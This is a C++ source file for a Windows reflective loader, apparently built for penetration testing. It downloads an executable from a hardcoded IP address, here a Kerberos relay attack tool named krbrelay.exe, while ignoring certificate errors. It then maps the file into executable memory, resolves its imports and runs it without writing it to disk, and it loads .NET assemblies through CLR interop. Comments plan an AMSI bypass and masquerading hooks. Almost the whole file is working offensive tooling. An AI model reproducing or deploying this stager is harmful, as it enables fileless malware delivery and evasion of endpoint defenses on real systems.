#pragma comment(lib, "wininet.lib")
#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>

// download file from url, returns buffer to file
char* httpStage(LPCSTR urlStr,size_t &out_size) {
	URL_COMPONENTSA urlComp;
	memset(&urlComp, 0, sizeof(URL_COMPONENTS));
	urlComp.dwStructSize = sizeof(URL_COMPONENTS);
	urlComp.dwHostNameLength = 1;
	urlComp.dwUrlPathLength = 1;
	InternetCrackUrlA(urlStr, strlen(urlStr), 0, &urlComp);

	// lpszHostName and lpszUrlPath do not have string delimiters '\0' and are just references to original string
	// new hostname and path need to be created
	LPSTR urlHostname = new CHAR[urlComp.dwHostNameLength+1];
	LPSTR urlPath = new CHAR[urlComp.dwUrlPathLength+1];
	memset(urlHostname, 0, urlComp.dwHostNameLength);
	memset(urlPath, 0, urlComp.dwUrlPathLength);
	if (urlComp.dwHostNameLength > 0) strncpy_s(urlHostname, urlComp.dwHostNameLength+1, urlComp.lpszHostName, urlComp.dwHostNameLength);
	if (urlComp.dwUrlPathLength > 0) strncpy_s(urlPath, urlComp.dwUrlPathLength+1, urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

	// WinINet template from: https://gist.github.com/AhnMo/5cf37bbd9a6fa2567f99ac0528eaa185
	HINTERNET hSession = InternetOpenA(
		"Mozilla/5.0",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET hConnect = InternetConnectA(
		hSession,
		urlHostname,
		urlComp.nPort, 
		NULL,
		NULL,
		INTERNET_SERVICE_HTTP,
		INTERNET_FLAG_KEEP_CONNECTION,
		0);

	DWORD reqFlags = INTERNET_FLAG_RELOAD;
	if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
		reqFlags |= INTERNET_FLAG_SECURE;
	}
	HINTERNET hHttpFile = HttpOpenRequestA(
		hConnect,
		"GET",
		urlPath,
		NULL,
		NULL,
		NULL,
		reqFlags, 
		0);

	// ignore ssl cert errors
	DWORD dwFlags = 0;
    DWORD dwBuffLen = sizeof(dwFlags);
    if (InternetQueryOption(hHttpFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen))
    {
       dwFlags |= SECURITY_SET_MASK;
       InternetSetOption(hHttpFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

	if (!HttpSendRequestA(hHttpFile, NULL, 0, 0, 0)) {
		char err[256];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err, (sizeof(err) / sizeof(wchar_t)), NULL);
		printf("[!] HTTP request failed %s", err);
		return NULL;
	}

	// buffer will grow in increments of BUFSIZ
	DWORD dwFileSize;
	dwFileSize = 512; // BUFSIZ
	char* httpBuffer = new char[dwFileSize];

	char* fileBuffer = NULL;
	size_t fileSize = 0;
	while (true) {
		DWORD dwBytesRead;
		BOOL bRead;

		bRead = InternetReadFile(
			hHttpFile,
			httpBuffer,
			dwFileSize,
			&dwBytesRead);

		if (dwBytesRead == 0) break;
		if (!bRead) break;
			
		// realloc pointer to new size
		fileBuffer = (char*)realloc(fileBuffer,(fileSize + dwFileSize)*sizeof(char));
		// check if enough space in memory
		if (fileBuffer == NULL) return NULL;
		// copy buffer with offset of previous arr data
		memcpy(&fileBuffer[fileSize*sizeof(char)], httpBuffer, dwFileSize);
		// add size
		fileSize += dwFileSize;
	}
	
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	out_size = fileSize;

	return fileBuffer;
}

// BASE_RELOCATION_BLOCK headers
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

// BASE_RELOCATION_ENTRY bitfields
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

// if image is allocated at preferred address, rebasing is not needed
DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
	// get delta between current image base and the PE that was read into memory
	DWORD_PTR deltaImageBase = (DWORD_PTR)peImageBase - (DWORD_PTR)ntHeader->OptionalHeader.ImageBase;

	// calculate/find relocatation table in allocated memory
	// https://en.wikipedia.org/wiki/Relocation_(computing)#Relocation_table
	IMAGE_DATA_DIRECTORY relocations = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)peImageBase;
	// rebase/patch each absolute address in relocation table .reloc in allocated memory (patching only needed if image is not written to perferred address)
	// TODO: [smart rebase](https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/)
	DWORD relocationsProcessed = 0;
	while (relocationsProcessed < relocations.Size) {
		// get relocation block header
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		// add size of block header
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);

		// calculate number of entries in relocation block
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		// get first entry in relocation block
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationBlock);
		// patch each relocation entry
		for (DWORD i = 0; i < relocationsCount; i++) {
			// add size of entry
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

		    // https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
			if (relocationEntries[i].Type == 0) continue; // this base relocation type is skipped

			// read absolute address in relocation entry
			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)peImageBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			// add delta(between preferred base and current base)
			addressToPatch += deltaImageBase;
			// write/patch new absolute address back into relocation entry
			memcpy((PVOID)((DWORD_PTR)peImageBase+relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
			// debugging print
			printf("Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
		}
	}
	return 0;
}

// import libraries, add function addresses to IAT, and hook commandline functions for masqurading
DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
	// resolve import address table
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	// get first import descriptor in IAT
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)peImageBase);

	LPCSTR libraryName = "";
	HMODULE library = NULL;
	while (importDescriptor->Name != NULL) {
		// get library name and load into current process
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)peImageBase;
		library = LoadLibraryA(libraryName);

		// resolve/find all thunks(function addresses/ordinals) and write then to importDescriptor
		if (library) {
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)peImageBase + importDescriptor->FirstThunk);

			// loop over thunks in import descriptor
			while (thunk->u1.AddressOfData != NULL && (int)thunk != 0x0000ffff) {
				// check if function is exported in dll by ordinal or by name(address) and add to IAT
				// https://docs.microsoft.com/en-us/cpp/build/exporting-functions-from-a-dll-by-ordinal-rather-than-by-name?view=msvc-170
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
					// debugging print
					printf("resolving function(ord) %d -> %x\n", thunk->u1.Ordinal, thunk->u1.Function);
				} else {
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)peImageBase + thunk->u1.AddressOfData);
					char* func_name = (char*)&(functionName->Name);

					// TODO: finish commandline argument hooking

					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, func_name);
					thunk->u1.Function = functionAddress;
					// debugging print
					printf("resolving function %s -> %x\n", functionName->Name, functionAddress);
				}
				thunk++;
			}
		}
		importDescriptor++;
	}

	return 0;
}


// TODO: AMSI bypass before loading
// .NET functions can be called through COM interop from unmanaged processes [MSDN](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/dd380851(v=vs.100)?redirectedfrom=MSDN)
// mscorlib.tlb is needed for definitions of .net types in unmanaged code when using the COM interfaces [MSDN](https://docs.microsoft.com/en-us/dotnet/framework/interop/how-to-reference-net-types-from-com)
#include <mscoree.h>
#pragma comment(lib, "mscoree.lib") // note: project may need to be built with mscoree.lib first for mscorlib.tlb to be recognized
#import <mscorlib.tlb> raw_interfaces_only			\
    	high_property_prefixes("_get","_put","_putref")		\
    	rename("ReportEvent", "InteropServices_ReportEvent")	\
		rename("or", "InteropServices_or") // rename so c# symbols do not overwrite C++ functions/symbols
// .NET program is reflectively loaded using COM interop functions
DWORD loadDotNet(void *code, size_t len, int argc, char** argv) {
	HRESULT                  res;
	ICorRuntimeHost          *cLRHost;
	IUnknownPtr              appDomainCOM;
	mscorlib::_AppDomainPtr  appDomainPtr;
	mscorlib::_AssemblyPtr   assemblyPtr;
	mscorlib::_MethodInfoPtr methodPtr;
	VARIANT                  parentObject, returnVal;
	SAFEARRAY                *safeArray;
	SAFEARRAYBOUND           safeArrBound;

	// initialize Common Language Runtime
	res = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	res = CoCreateInstance(
	  CLSID_CorRuntimeHost, 
	  NULL, 
	  CLSCTX_ALL,
	  IID_ICorRuntimeHost, 
	  (LPVOID*)&cLRHost);
	if(FAILED(res)) return 1;

	// start Common Language Runtime
	res = cLRHost->Start();
	if (FAILED(res)) {
		cLRHost->Release();
		return 1;
	}

	// get CLR default domain for current process, provides container for virtual address space of managed program
	res = cLRHost->GetDefaultDomain(&appDomainCOM);
	if (FAILED(res)) {
		cLRHost->Stop();
		return 1;
	}
	// get interface pointer for default app domain from COM IUnknown (IUnkowns are used by COM to cast interfaces)
	res = appDomainCOM->QueryInterface(IID_PPV_ARGS(&appDomainPtr));
	if (FAILED(res)) {
		appDomainCOM->Release();
		return 1;
	}

	// create COM "array" and copy managed PE file
	safeArrBound.lLbound   = 0;
	safeArrBound.cElements = len;
	safeArray = SafeArrayCreate(VT_UI1, 1, &safeArrBound);
	if (safeArray == NULL) {
		appDomainPtr->Release();
		return 1;
	}
	CopyMemory(safeArray->pvData, code, len);
	// load safe array into app domain
	res = appDomainPtr->Load_3(safeArray, &assemblyPtr);
	if (FAILED(res)) {
		SafeArrayDestroy(safeArray);
		return 1;
	}

	// get Main method from loaded assembly
	res = assemblyPtr->get_EntryPoint(&methodPtr);
	if (FAILED(res)) {
		assemblyPtr->Release();
		return 1;
	}

	// create COM compatible parameters argv**
	VARIANT args;
	args.vt = VT_ARRAY | VT_BSTR; // varient types: https://docs.microsoft.com/en-us/previous-versions/windows/embedded/ms897140(v=msdn.10)
	SAFEARRAYBOUND argsBound[1];
	argsBound[0].lLbound = 0;
	argsBound[0].cElements = argc;
	args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
	// add strings from argv to COM compatible argv
	wchar_t wstr[256];
	size_t size;
	long idx[1];
	for (int i = 0; i < argc; i++)
	{
		idx[0] = i;
		mbstowcs_s(&size, wstr, 256, argv[i], 256-1);
		SafeArrayPutElement(args.parray, idx, SysAllocString(wstr));
	}
	// add argument to parameter array for method
	SAFEARRAY *params = NULL;
	SAFEARRAYBOUND paramsBound[1];
	paramsBound[0].lLbound = 0;
	paramsBound[0].cElements = 1;
	params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
	idx[0] = 0;
	SafeArrayPutElement(params, idx, &args);

	//// get number of parameters
	//SAFEARRAY* paramInfo = NULL;
	//SAFEARRAYBOUND infoBound[1];
	//infoBound[0].lLbound = 0;
	//infoBound[0].cElements = 1;
	//params = SafeArrayCreate(VT_VARIANT, 1, infoBound);
	//methodPtr->GetParameters(&paramInfo);
	//LONG  nLower = 0;
	//SafeArrayGetLBound(paramInfo, 1, &nLower);
	//nLower++;

	// invoke method
	parentObject.vt    = VT_NULL; // object value NULL because entry function is static
	parentObject.plVal = NULL;
	res = methodPtr->Invoke_3(parentObject, params, &returnVal);
	if (FAILED(res)) {
		_com_error err(res);
		LPCTSTR errMsg = err.ErrorMessage();
		wprintf(L"[!] Invoke_3 failed error message: %s", errMsg);
		return 1;
	}

	methodPtr->Release();
	return 0;
}

// reference: https://github.com/aaaddress1/RunPE-In-Memory Pe Loading
// reference: https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/ .NET loading
// 1. copy header and image sections from PE into allocated memory
// 2. if memory could not be allocated at preferred address, rebase all absolute address in relocation table (`.reloc`)
// 3. load all libraries/dlls in import address table(IAT) into current process
// 4. resolve all thunks(pointer to address of function) addresses/ordinals in imported libraries and write into IAT
// 5. execute PE with entry function
DWORD reflectiveLoader(char* peBuffer, int len, int argc, char** argv) {
	// parse DOS header from PE
	// https://en.wikipedia.org/wiki/DOS_MZ_executable
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peBuffer;
	// check if file is MS-DOS executable with DOS magic number `5A4D`
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[!] file is not in PE format. (missing MS-DOS header)\n");
		return 1;
	}
	// get NT header
	// https://en.wikipedia.org/wiki/New_Executable
	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)peBuffer + dosHeader->e_lfanew);
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		printf("[!] file is not in PE format, meant for DOS mode, and is not a 'New Executable'. (missing NT header)\n");
		return 1;
	}
	// get image size
	SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
	// get preferred base address
	LPVOID preferredAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;

	// check if PE is .NET
	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
		// .net doesn't need section loading for process memory, mscoree.lib handles this
		loadDotNet(peBuffer, len, argc, argv);
		return 0;
	}

	// unmap image base if it has been previously mapped
	// only needed if ReflectiveLoader is loaded into a process twice?
	// NtUnmapViewOfSection does not have a corresponding user-mode function
	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

	// try to alloc memory for image at preferred address
	// TODO: allocate during HTTP download
	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// if allocation not possible at preferred address, allocate anywhere
	if (!peImageBase) {
		peImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
	if (!peImageBase) {
		printf("[!] cannot allocate image base, memory capacity reached?\n");
		return 1;
	}

	// copy image header to allocated memory
	memcpy(peImageBase, peBuffer, ntHeader->OptionalHeader.SizeOfHeaders);
	// copy image sections(.text, .data, .bss, ect) to allocated memory
	IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		memcpy(
			LPVOID(size_t(peImageBase) + sectionHeader[i].VirtualAddress), // destination: ImageBase + RVA = VA
			LPVOID(size_t(peBuffer) + sectionHeader[i].PointerToRawData), // source: Buffer addr + raw data(file offset)
			sectionHeader[i].SizeOfRawData
		);
	}

	// if image is allocated at preferred address, rebasing is not needed
	if (preferredAddr != peImageBase) {
		// rebase image relative to newly allocated memory address
		if (rebaseImage(peImageBase, ntHeader)) {
			printf("[!] image cannot be rebased");
			return 1;
		}
	}

	// import libraries, add function addresses to IAT, and hook commandline functions for masqurading
	if (resolveImportAddressTable(peImageBase, ntHeader)) {
		printf("[!] imports cannot be resolved");
		return 1;
	}

	// execute PE
	size_t entryAddr = (size_t)(peImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
	((void(*)())entryAddr)();

	return 0;
}


int main(int argc, char** argv)
{
	//if (argc < 2) {
	//	printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
	//	return 0;
	//}
	LPCSTR url = "http://99.244.116.52:8080/pentest/krbrelay.exe";

	// download PE from url
	size_t peSize;
	char* peBuffer = httpStage(url, peSize);
	if (peBuffer == NULL) {
		printf("[!] HTTP request failed");
		return 1;
	}

	// call reflectiveLoader
	reflectiveLoader(peBuffer, peSize, argc, argv);
}

